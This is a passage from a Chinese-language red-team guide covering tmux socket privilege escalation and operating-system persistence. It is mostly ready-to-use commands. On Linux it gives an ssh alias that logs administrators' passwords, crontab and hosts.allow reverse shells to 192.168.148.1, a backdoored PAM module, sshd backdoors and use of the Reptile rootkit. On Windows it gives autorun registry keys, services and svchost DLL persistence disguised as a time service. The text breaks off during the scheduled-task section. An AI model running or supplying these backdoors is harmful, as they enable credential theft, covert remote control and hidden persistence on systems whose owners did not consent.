<p>因为现在运行的这个tmux是root权限，只要连接到当前这个tmux，就可以获取到root权限。<br>
<img src="https://img-blog.csdnimg.cn/2020100422035494.png#pic_center" alt="在这里插入图片描述"><br>
通过查看历史命令记录可以发现，tmux 通过了-S参数指定了socket的路径<br>
<img src="https://img-blog.csdnimg.cn/20201004220413160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201004220418708.png#pic_center" alt="在这里插入图片描述"><br>
使用相同的方式连接SOCKET就可以获取root权限。</p>
<pre><code class="prism language-c">tmux <span class="token operator">-</span>S <span class="token operator">/</span><span class="token punctuation">.</span>devs<span class="token operator">/</span>dev_sess
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201004220438347.png#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201004220443111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
通过查看系统的应用，或者第三方应用，查找服务本身是否存在问题，或者是否配置存在问题，如大家常见的mysql udf提权！</p>
<hr>
<p>权限提升参考总文章：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>secpulse<span class="token punctuation">.</span>com<span class="token operator">/</span>archives<span class="token operator">/</span><span class="token number">138197.</span>html
</code></pre>
<hr>
<h1><a id="_3913"></a>七、权限维持</h1>
<h2><a id="71__3914"></a>7.1 操作系统后门</h2>
<h2><a id="711_Linux_3915"></a>7.1.1 Linux</h2>
<h2><a id="Linux_3917"></a>Linux操作系统后门</h2>
<p><strong>alias</strong></p>
<p>alias 命令可以设置别名</p>
<pre><code class="prism language-c">执行 ll 相当于执行 ls <span class="token operator">-</span>l
</code></pre>
<pre><code class="prism language-c">alias ll<span class="token operator">=</span>ls <span class="token operator">-</span>l
</code></pre>
<p><strong>ssh 后门设计</strong></p>
<pre><code class="prism language-c">在管理员使用 ssh 时生效，后门将输入的 ssh 地址账号密码保存到 <span class="token operator">/</span>tmp<span class="token operator">/</span>sshpwd<span class="token operator">-</span>date<span class="token punctuation">.</span>log 中
strace 命令可以跟踪进程运行时，系统调用和接受的信号
</code></pre>
<pre><code class="prism language-c">alias ssh<span class="token operator">=</span><span class="token string">'strace -o /tmp/sshpwd-`date '</span><span class="token operator">+</span><span class="token operator">%</span>Y<span class="token operator">-</span><span class="token operator">%</span>m<span class="token operator">-</span><span class="token operator">%</span>d<span class="token operator">-</span><span class="token operator">%</span>H<span class="token operator">-</span><span class="token operator">%</span>M<span class="token operator">-</span><span class="token operator">%</span>S<span class="token operator">-</span><span class="token operator">%</span>s<span class="token string">'`.log -e read,write,connect -s2048 ssh'</span>
</code></pre>
<p><strong>计划任务</strong></p>
<pre><code class="prism language-c">每隔 <span class="token number">60</span> 分钟执行一次，将 shell 反弹到 <span class="token number">192.168</span><span class="token number">.148</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token function">8888</span><span class="token punctuation">(</span>crontab <span class="token operator">-</span>l<span class="token punctuation">;</span>printf <span class="token string">"*/60 * * * * exec 9&lt;&gt; /dev/tcp/192.168.148.1/8888;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n"</span><span class="token punctuation">)</span><span class="token operator">|</span>crontab <span class="token operator">-</span>
</code></pre>
<p><strong>TCP_Wrappers</strong></p>
<p>TCP_Wrappers 是一个工作在应用层的安全工具<br>
以 ssh 为例，每当有 ssh 的连接请求时，tcpd（Tcp Wrapper的守护进程）即会截获请求，<br>
当请求满足配置文件中的规则，则放行，否则中断连接，配置文件中可设置匹配规则后执行命令</p>
<p>使用 ssh 连接目标服务器触发反弹 shell</p>
<pre><code class="prism language-c">echo <span class="token string">'ALL: ALL: spawn (bash -c "/bin/bash -i &gt;&amp; /dev/tcp/192.168.148.1/8888 0&gt;&amp;1") &amp; :allow'</span> <span class="token operator">&gt;</span> <span class="token operator">/</span>etc<span class="token operator">/</span>hosts<span class="token punctuation">.</span>allow
</code></pre>
<p><strong>PAM后门</strong></p>
<p>PAM 是一种认证机制，提供一套统一的 API，可根据需要给不同的服务配置不同的认证方式</p>
<p><strong>1）添加后门：</strong></p>
<p>查看本地 PAM 版本</p>
<pre><code class="prism language-c">apt list <span class="token operator">--</span>installed<span class="token operator">|</span>grep pam
</code></pre>
<p>2）下载解压对应版本的 PAM 源码 http://www.linux-pam.org/library/</p>
<pre><code class="prism language-c">wget http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>linux<span class="token operator">-</span>pam<span class="token punctuation">.</span>org<span class="token operator">/</span>library<span class="token operator">/</span>Linux<span class="token operator">-</span>PAM<span class="token operator">-</span><span class="token number">1.1</span><span class="token number">.8</span><span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gz
tar <span class="token operator">-</span>xzvf Linux<span class="token operator">-</span>PAM<span class="token operator">-</span><span class="token number">1.1</span><span class="token number">.8</span><span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gz
</code></pre>
<p>3）修改源码，添加后门代码</p>
<pre><code class="prism language-c">vim <span class="token punctuation">.</span><span class="token operator">/</span>Linux<span class="token operator">-</span>PAM<span class="token operator">-</span><span class="token number">1.1</span><span class="token number">.8</span><span class="token operator">/</span>modules<span class="token operator">/</span>pam_unix<span class="token operator">/</span>pam_unix_auth<span class="token punctuation">.</span>c
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201004221247797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
4）替换原有 PAM 模块，添加后门</p>
<pre><code class="prism language-c">cd Linux<span class="token operator">-</span>PAM<span class="token operator">-</span><span class="token number">1.1</span><span class="token number">.8</span>

编译 PAM 源码
<span class="token punctuation">.</span><span class="token operator">/</span>configure <span class="token operator">&amp;&amp;</span> make

备份原有 PAM 模块
mv <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>security<span class="token operator">/</span>pam_unix<span class="token punctuation">.</span>so <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>security<span class="token operator">/</span>pam_unix<span class="token punctuation">.</span>so<span class="token punctuation">.</span>bak

使用新编译的 PAM 模块替换原有模块
cp <span class="token punctuation">.</span><span class="token operator">/</span>modules<span class="token operator">/</span>pam_unix<span class="token operator">/</span><span class="token punctuation">.</span>libs<span class="token operator">/</span>pam_unix<span class="token punctuation">.</span>so <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>security<span class="token operator">/</span>
</code></pre>
<p><strong>后门测试</strong></p>
<p>使用添加的密码 test 登陆<br>
<img src="https://img-blog.csdnimg.cn/20201004221340820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
当管理员登陆成功时，密码会被记录在 /etc/pam.txt 中<br>
<img src="https://img-blog.csdnimg.cn/20201004221352278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2><a id="SSH_4001"></a>SSH后门</h2>
<p>执行下面的命令后可使用任意密码 ssh 连接目标机器 8888 端口</p>
<pre><code class="prism language-c">ln <span class="token operator">-</span>sf <span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>sshd <span class="token operator">/</span>tmp<span class="token operator">/</span>su<span class="token punctuation">;</span><span class="token operator">/</span>tmp<span class="token operator">/</span>su <span class="token operator">-</span>oPort<span class="token operator">=</span><span class="token number">8888</span>
</code></pre>
<h2><a id="SSH_Trapper_4007"></a>SSH Trapper后门</h2>
<p>后门比较隐蔽，没有开放额外的端口，只要对方开了 ssh 服务，就能远程连接</p>
<p>如果源端口是 8888 就直接反弹 shell，否则就把请求转发给真正的 ssh 服务</p>
<p>后门伪装成一个 perl 脚本，名为 sshd，位于 /usr/sbin/sshd，将系统原来的 sshd 移到 /usr/bin 下</p>
<p><strong>创建后门</strong></p>
<pre><code class="prism language-c">cd <span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>
mv sshd <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>bin<span class="token operator">/</span>
echo <span class="token string">'#!/usr/bin/perl'</span> <span class="token operator">&gt;</span>sshd
echo <span class="token string">'exec "/bin/sh" if(getpeername(STDIN) =~ /^.."\xb8/);'</span> <span class="token operator">&gt;&gt;</span>sshd
echo <span class="token string">'exec{"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,'</span> <span class="token operator">&gt;&gt;</span>sshd
chmod u<span class="token operator">+</span>x sshd
<span class="token operator">/</span>etc<span class="token operator">/</span>init<span class="token punctuation">.</span>d<span class="token operator">/</span>sshd restart
</code></pre>
<p><strong>连接后门</strong></p>
<pre><code class="prism language-c">socat STDIO TCP4<span class="token punctuation">:</span><span class="token number">192.168</span><span class="token number">.148</span><span class="token number">.128</span><span class="token punctuation">:</span><span class="token number">22</span><span class="token punctuation">,</span>sourceport<span class="token operator">=</span><span class="token number">8888</span><span class="token punctuation">;</span>
</code></pre>
<p><strong>修改后门的端口</strong></p>
<pre><code class="prism language-c"><span class="token macro property"># python2</span>
import <span class="token keyword">struct</span>
buffer <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&gt;I6'</span><span class="token punctuation">,</span><span class="token number">8888</span><span class="token punctuation">)</span>
<span class="token function">print</span><span class="token punctuation">(</span><span class="token function">repr</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<h2><a id="Rookit_4038"></a>Rookit</h2>
<p>Rootkit 是一种特殊的后门，可以在目标机器上隐藏自身以及指定的文件，进程，网络连接信息</p>
<p>下面以一款开源 rootkit 为例，简单介绍一下它的用法以及功能特点</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>f0rb1dd3n<span class="token operator">/</span>Reptile
</code></pre>
<p>目标机安装 Reptile</p>
<pre><code class="prism language-c">apt install libncurses<span class="token operator">-</span>dev
git clone https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>f0rb1dd3n<span class="token operator">/</span>Reptile<span class="token punctuation">.</span>git
cd Reptile
make menuconfig
make
make installapt<span class="token operator">-</span>cache search linux
</code></pre>
<p>目标机后门配置<br>
<img src="https://img-blog.csdnimg.cn/20201004221632280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201004221639464.png#pic_center" alt="在这里插入图片描述"><br>
<strong>目标机本地使用</strong></p>
<p>赋予非特权用户以 root 权限</p>
<pre><code class="prism language-c"><span class="token operator">/</span>reptile<span class="token operator">/</span>reptile_cmd root
</code></pre>
<p>隐藏显示文件，目录和内核模块<br>
名称中具有关键字 reptile 的所有文件和文件夹将被隐藏，关键字可以在安装之前进行配置</p>
<pre><code class="prism language-c"><span class="token operator">/</span>reptile<span class="token operator">/</span>reptile_cmd hide
<span class="token operator">/</span>reptile<span class="token operator">/</span>reptile_cmd show
</code></pre>
<p>隐藏显示进程</p>
<pre><code class="prism language-c"><span class="token operator">/</span>reptile<span class="token operator">/</span>reptile_cmd conn <span class="token operator">&lt;</span>IP<span class="token operator">&gt;</span> hide
<span class="token operator">/</span>reptile<span class="token operator">/</span>reptile_cmd conn <span class="token operator">&lt;</span>IP<span class="token operator">&gt;</span> show
</code></pre>
<p>隐藏显示 TCP 和 UDP 连接</p>
<pre><code class="prism language-c"><span class="token operator">/</span>reptile<span class="token operator">/</span>reptile_cmd conn <span class="token operator">&lt;</span>IP<span class="token operator">&gt;</span> hide
<span class="token operator">/</span>reptile<span class="token operator">/</span>reptile_cmd conn <span class="token operator">&lt;</span>IP<span class="token operator">&gt;</span> show
</code></pre>
<p>文件内容篡改<br>
标签之间的所有内容将被隐藏</p>
<pre><code class="prism language-c">#<span class="token operator">&lt;</span>reptile<span class="token operator">&gt;</span>
content to hide
#<span class="token operator">&lt;</span><span class="token operator">/</span>reptile<span class="token operator">&gt;</span>
</code></pre>
<p><strong>攻击机连接后门</strong></p>
<p>攻击机安装运行控制端</p>
<pre><code class="prism language-c">apt install libreadline<span class="token operator">-</span>dev
git clone https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>f0rb1dd3n<span class="token operator">/</span>Reptile<span class="token punctuation">.</span>git
cd Reptile
make client
cd output
<span class="token punctuation">.</span><span class="token operator">/</span>client
</code></pre>
<p>使用攻击机的特定端口（666）给目标机任意端口发送特定数据（hax0r）<br>
当目标机接收到这个数据后，按照配置反弹 shell（2333）<br>
<img src="https://img-blog.csdnimg.cn/20201004221754357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,s%60%E5%9C%A8%E8%BF%99%E9%87%8C%E6%8F%92%E5%85%A5%E4%BB%A3%E7%A0%81%E7%89%87%60hadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
参考文章：<code>https://cloud.tencent.com/developer/article/1666643</code></p>
<hr>
<h2><a id="712_Windows_4117"></a>7.1.2 Windows</h2>
<p><strong>0x00 前言&amp;场景</strong></p>
<p>在红队中对于拿到的shell或钓上来的鱼，目前比较流行用CS做统一管理，但实战中发现CS官方没有集成一键权限维持的功能，收集的一些第三方开发的插件也大多不完善或者使用很麻烦，甚至有一些还有BUG导致我们以为成功了实际上却没有，最终丢掉了shell。<br>
故基于此场景整理Windows环境中的持久化方法，后续将一些比较常用且便捷的操作整合成CS插件，确保在拿到shell的时候快速保住权限。</p>
<p><strong>0x01 Startup目录</strong></p>
<p>权限要求：提权不提权都可。<br>
这是最常用也是最简单的权限维持了，放在该目录下的程序或快捷方式会在用户登录时自动运行，就不多说了。<br>
NT6以后的目录如下：</p>
<pre><code class="prism language-c">对当前用户有效：
C<span class="token punctuation">:</span>\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
对所有用户有效：
C<span class="token punctuation">:</span>\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
</code></pre>
<p>NT6以前的目录如下：</p>
<pre><code class="prism language-c">对当前用户有效：
C<span class="token punctuation">:</span>\Documents and Settings\Hunter\「开始」菜单\程序\启动
对所有用户有效：
C<span class="token punctuation">:</span>\Documents and Settings\All Users\「开始」菜单\程序\启动
</code></pre>
<p><strong>0x02 注册键</strong></p>
<p>权限要求：提权不提权都可。</p>
<p>Windows庞大的注册表以及相对不严格的权限管理给了我们很多做手脚的机会，其中注册表自启项是比较常用的持久化操作了。</p>
<p>注册表作为Windows的核心数据库，存储着系统和用户的很多关键信息。<br>
Windows在注册表中提供了两套独立的路径，一个是上面提到的当前用户的“HKEY_CURRENT_USER”即“HKCU”，另一个就是针对当前用户物理状态的“HKEY_LOCAL_MACHINE”即“HKLM”，仅有特权账户可以对其进行修改。<br>
随着安全意识的提高，目前在红队中搞到的Windows大多都是降权的。特别是钓鱼得到的PC机提权的意义不大，因为即使提权写了Administrator的启动项，用户下一次登录也还是进自己的账户，持久化就白做了。</p>
<p>整理Windows下的所有注册键如下：</p>
<pre><code class="prism language-c"><span class="token number">1.L</span>oad注册键
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Windows＼load

<span class="token number">2.U</span>serinit注册键
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Winlogon＼Userinit
通常该注册键下面有一个userinit<span class="token punctuation">.</span>exe。该键允许指定用逗号分隔的多个程序，如userinit<span class="token punctuation">.</span>exe<span class="token punctuation">,</span>evil<span class="token punctuation">.</span>exe。

<span class="token number">3.</span>Explorer＼Run注册键
Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run
Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。

<span class="token number">4.</span>RunServicesOnce注册键
RunServicesOnce注册键用来启动服务程序，启动时间在用户登录之前，而且先于其他通过注册键启动的程序，在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunServicesOnce
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼ Windows＼CurrentVersion＼RunServicesOnce

<span class="token number">5.</span>RunServices注册键
RunServices注册键指定的程序紧接RunServicesOnce指定的程序之后运行，但两者都在用户登录之前。
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼ RunServices
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼ CurrentVersion＼RunServices

<span class="token number">6.</span>RunOnce＼Setup注册键
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup

<span class="token number">7.</span>RunOnce注册键
安装程序通常用RunOnce键自动运行程序，它的位置在
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce
<span class="token punctuation">[</span>小于NT6<span class="token punctuation">]</span>HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnceEx
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce
HKEY_LOCAL_MACHINE下面的RunOnce键会在用户登录之后立即运行程序，运行时机在其他Run键指定的程序之前；HKEY_CURRENT_USER下面的RunOnce键在操作系统处理其他Run键以及“启动”文件夹的内容之后运行。

<span class="token number">8.</span>Run注册键
HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Run
HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Run
Run是自动运行程序最常用的注册键，HKEY_CURRENT_USER下面的Run键紧接HKEY_LOCAL_MACHINE下面的Run键运行，但两者都在处理“启动”文件夹之前。
</code></pre>
<p>写入注册键命令如下：</p>
<pre><code class="prism language-c">reg add <span class="token string">"XXXX"</span> <span class="token operator">/</span>v evil <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>d <span class="token string">"[Absolute Path]\evil.exe"</span>
</code></pre>
<p><strong>0x03 服务</strong></p>
<p>权限要求：未降权的管理员权限。</p>
<p>创建服务是需要非降权管理员权限的，因此拿到shell后要用这种方法做维持首先要提权，但其优点是隐蔽性比注册键高（如用svchost的服务组加载DLL就可以隐藏掉恶意进程）。CMD和Powershell都可以用命令添加服务，样例如下：</p>
<pre><code class="prism language-c">sc create evil binpath<span class="token operator">=</span> <span class="token string">"cmd.exe /k [Absolute Path]evil.exe"</span> start<span class="token operator">=</span> <span class="token string">"auto"</span> obj<span class="token operator">=</span> <span class="token string">"LocalSystem"</span>
</code></pre>
<p>这种直接通过cmd拉起的服务创建起来很简单。这里需要注意一个小坑：shellcodeloader主线程会阻塞导致服务启动时认为程序无响应而失败，因此必须用cmd拉起来，不能直接创建服务。服务正常启动后进程以SYSTEM权限在用户登录前运行。但缺点也很明显，恶意进程还是独立存在的，隐蔽性较差。如下图：</p>
<p><img src="https://img-blog.csdnimg.cn/20201004224256716.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
还有一类服务是通过svchost启动，由于Windows系统中的许多服务都是通过注入到该程序中启动（这也是官方认可的DLL注入动作），因此只要DLL本身免杀，杀毒软件就不会理会这种行为，并且由于恶意进程并不是独立存在的，隐蔽性相对较高。</p>
<p>但使用svchost加载服务就不是一行命令可以完成的，不仅需要自己做一个服务DLL，还需要额外在注册表中添加一些东西。由于64位系统有两套注册表和两套svchost，因此命令还有微小的不同。</p>
<p>32位系统命令如下：</p>
<pre><code class="prism language-c">sc create TimeSync binPath<span class="token operator">=</span> <span class="token string">"C:\Windows\System32\svchost.exe -k netsvr"</span> start<span class="token operator">=</span> <span class="token keyword">auto</span> obj<span class="token operator">=</span> LocalSystem
reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync\Parameters <span class="token operator">/</span>v ServiceDll <span class="token operator">/</span>t REG_EXPAND_SZ <span class="token operator">/</span>d <span class="token string">"C:\Users\hunter\Desktop\localService32.dll"</span> <span class="token operator">/</span>f <span class="token operator">/</span>reg<span class="token punctuation">:</span><span class="token number">32</span>
reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync <span class="token operator">/</span>v Description <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>d <span class="token string">"Windows Time Synchronization Service"</span> <span class="token operator">/</span>f <span class="token operator">/</span>reg<span class="token punctuation">:</span><span class="token number">32</span>
reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync <span class="token operator">/</span>v DisplayName <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>d <span class="token string">"TimeSyncSrv"</span> <span class="token operator">/</span>f <span class="token operator">/</span>reg<span class="token punctuation">:</span><span class="token number">32</span>
reg add <span class="token string">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"</span> <span class="token operator">/</span>v netsvr <span class="token operator">/</span>t REG_MULTI_SZ <span class="token operator">/</span>d TimeSync <span class="token operator">/</span>f <span class="token operator">/</span>reg<span class="token punctuation">:</span><span class="token number">32</span>
sc start TimeSync
</code></pre>
<p>64位系统中注册32位服务命令如下：</p>
<pre><code class="prism language-c">sc create TimeSync binPath<span class="token operator">=</span> <span class="token string">"C:\Windows\Syswow64\svchost.exe -k netsvr"</span> start<span class="token operator">=</span> <span class="token keyword">auto</span> obj<span class="token operator">=</span> LocalSystem
reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync\Parameters <span class="token operator">/</span>v ServiceDll <span class="token operator">/</span>t REG_EXPAND_SZ <span class="token operator">/</span>d <span class="token string">"C:\Users\hunter\Desktop\localService32.dll"</span> <span class="token operator">/</span>f <span class="token operator">/</span>reg<span class="token punctuation">:</span><span class="token number">32</span>
reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync <span class="token operator">/</span>v Description <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>d <span class="token string">"Windows Time Synchronization Service"</span> <span class="token operator">/</span>f <span class="token operator">/</span>reg<span class="token punctuation">:</span><span class="token number">32</span>
reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync <span class="token operator">/</span>v DisplayName <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>d <span class="token string">"TimeSyncSrv"</span> <span class="token operator">/</span>f <span class="token operator">/</span>reg<span class="token punctuation">:</span><span class="token number">32</span>
reg add <span class="token string">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"</span> <span class="token operator">/</span>v netsvr <span class="token operator">/</span>t REG_MULTI_SZ <span class="token operator">/</span>d TimeSync <span class="token operator">/</span>f <span class="token operator">/</span>reg<span class="token punctuation">:</span><span class="token number">32</span>
sc start TimeSync
</code></pre>
<p>64位系统命令如下：</p>
<pre><code class="prism language-c">sc create TimeSync binPath<span class="token operator">=</span> <span class="token string">"C:\Windows\System32\svchost.exe -k netsvr"</span> start<span class="token operator">=</span> <span class="token keyword">auto</span> obj<span class="token operator">=</span> LocalSystem
reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync\Parameters <span class="token operator">/</span>v ServiceDll <span class="token operator">/</span>t REG_EXPAND_SZ <span class="token operator">/</span>d <span class="token string">"C:\Users\hunter\Desktop\localService32.dll"</span> <span class="token operator">/</span>f <span class="token operator">/</span>reg<span class="token punctuation">:</span><span class="token number">64</span>
reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync <span class="token operator">/</span>v Description <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>d <span class="token string">"Windows Time Synchronization Service"</span> <span class="token operator">/</span>f <span class="token operator">/</span>reg<span class="token punctuation">:</span><span class="token number">64</span>
reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync <span class="token operator">/</span>v DisplayName <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>d <span class="token string">"TimeSyncSrv"</span> <span class="token operator">/</span>f <span class="token operator">/</span>reg<span class="token punctuation">:</span><span class="token number">64</span>
reg add <span class="token string">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"</span> <span class="token operator">/</span>v netsvr <span class="token operator">/</span>t REG_MULTI_SZ <span class="token operator">/</span>d TimeSync <span class="token operator">/</span>f <span class="token operator">/</span>reg<span class="token punctuation">:</span><span class="token number">64</span>
sc start TimeSync
</code></pre>
<p>注意这里有个大坑，使用“reg add”命令向注册表键中添加数据的时候是直接覆盖的，而“HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost”中的大多数的键都是REG_MULTI_SZ类型，即多行数据。因此千万不能直向已经存在的键中写入数据，系统启动所需要的服务都在里面，覆盖后会出大问题！（所以上面命令中是用的“netsvr”，这个键默认是不存在的）</p>
<p><strong>0x04 计划任务</strong></p>
<p>权限要求：未降权的管理员权限/普通用户。</p>
<p>计划任务也是一项很好的持久化利用点。不同于自启注册键和服务项，计划任务的设定方式更多样、灵活，位置也相对较为隐蔽（手工排查要多点几下）。比如，曾经在一线做安服的时候，有一阵子碰到闹得很凶的“驱动人生”挖矿木马其中的一个持久化方式就是在定时任务中创建了很多powershell脚本来做的持久化，它的stager直接以base64编码的方式写在计划任务的命令行参数中。那个输入框很短，对没有经验的工程师来说后面的内容就很容易没有看到而忽略掉。</p>
<p>Windows中有命令“SCHTASKS”用来管理计划任务，支持下面几个选项：</p>
<pre><code class="prism language-c">SCHTASKS <span class="token operator">/</span>parameter <span class="token punctuation">[</span>arguments<span class="token punctuation">]</span>

描述<span class="token punctuation">:</span>
    允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任
    务。

参数列表<span class="token punctuation">:</span>
    <span class="token operator">/</span>Create         创建新计划任务。

    <span class="token operator">/</span>Delete         删除计划任务。

    <span class="token operator">/</span>Query          显示所有计划任务。

    <span class="token operator">/</span>Change         更改计划任务属性。

    <span class="token operator">/</span>Run            按需运行计划任务。

    <span class="token operator">/</span>End            中止当前正在运行的计划任务。

    <span class="token operator">/</span>ShowSid        显示与计划的任务名称相应的安全标识符。

    <span class="token operator">/</span><span class="token operator">?</span>              显示此帮助消息。
</code></pre>
<p>在持久化过程中比较常用的命令是Create，由于参数相对较多因此复制到下面做参考：</p>
<pre><code class="prism language-c">SCHTASKS <span class="token operator">/</span>Create <span class="token punctuation">[</span><span class="token operator">/</span>S system <span class="token punctuation">[</span><span class="token operator">/</span>U username <span class="token punctuation">[</span><span class="token operator">/</span>P <span class="token punctuation">[</span>password<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
    <span class="token punctuation">[</span><span class="token operator">/</span>RU username <span class="token punctuation">[</span><span class="token operator">/</span>RP password<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">/</span>SC schedule <span class="token punctuation">[</span><span class="token operator">/</span>MO modifier<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">/</span>D day<span class="token punctuation">]</span>
    <span class="token punctuation">[</span><span class="token operator">/</span>M months<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">/</span>I idletime<span class="token punctuation">]</span> <span class="token operator">/</span>TN taskname <span class="token operator">/</span>TR taskrun <span class="token punctuation">[</span><span class="token operator">/</span>ST starttime<span class="token punctuation">]</span>
